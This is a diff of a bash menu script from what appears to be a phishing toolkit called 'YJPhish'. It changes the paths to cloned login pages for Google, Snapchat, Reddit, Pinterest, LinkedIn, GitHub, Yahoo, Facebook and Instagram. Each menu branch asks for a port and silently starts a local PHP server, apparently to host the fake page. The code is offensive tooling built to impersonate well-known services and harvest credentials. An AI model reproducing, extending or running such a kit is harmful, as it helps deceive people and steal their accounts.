@@ -41,7 +41,7 @@ read yenoj
 case "$yenoj" in
 1)echo " "
 if [ $yenoj='1' ] ; then
-postion='google'
+postion='YJPhish/sites/google'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -58,7 +58,7 @@ bash YJP.sh ;;
 
 2)echo " "
 if [ $yenoj='2' ] ; then
-postion='snapchat'
+postion='YJPhish/sites/snapchat'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -75,7 +75,7 @@ bash YJP.sh ;;
 
 3)echo " "
 if [ $yenoj='3' ] ; then
-postion='reddit'
+postion='YJPhish/sites/reddit'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -92,7 +92,7 @@ bash YJP.sh ;;
 
 4)echo " "
 if [ $yenoj='4' ] ; then
-postion='pinterest'
+postion='YJPhish/sites/pinterest'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -109,7 +109,7 @@ bash YJP.sh ;;
 
 5)echo " "
 if [ $yenoj='5' ] ; then
-postion='linkedin'
+postion='YJPhish/sites/linkedin'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -126,7 +126,7 @@ bash YJP.sh ;;
 
 6)echo " "
 if [ $yenoj='6' ] ; then
-postion='github'
+postion='YJPhish/sites/github'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -143,7 +143,7 @@ bash YJP.sh ;;
 
 7)echo " "
 if [ $yenoj='7' ] ; then
-postion='yahoo'
+postion='YJPhish/sites/yahoo'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -160,7 +160,7 @@ bash YJP.sh ;;
 
 8)echo " "
 if [ $yenoj='8' ] ; then
-postion='facebook'
+postion='YJPhish/sites/facebook'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
@@ -177,7 +177,7 @@ bash YJP.sh ;;
 
 9)echo " "
 if [ $yenoj='9' ] ; then
-postion='instagram'
+postion='YJPhish/sites/instagram'
 echo -e "$ylo [#]type port no.(5555)="$rset
 read port
 php -S localhost:$port > /dev/null 2>&1  &
